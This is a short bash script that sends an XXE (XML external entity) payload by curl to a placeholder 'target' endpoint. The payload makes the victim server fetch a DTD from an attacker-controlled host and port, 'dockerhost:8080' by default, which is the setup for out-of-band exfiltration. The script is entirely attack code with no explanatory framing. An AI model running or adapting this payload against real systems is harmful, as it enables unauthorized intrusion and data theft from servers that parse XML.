#!/bin/bash

host=${1:-dockerhost}
port=${2:-8080}
prefix=${3:-serveme}

set +H #turn off history expansion to freely use !

curl "https://target/xxe_vulnerability" -H 'Content-Type: application/xml' --data "<!DOCTYPE r SYSTEM \"http://${host}:${port}/${prefix}\"><r></r>"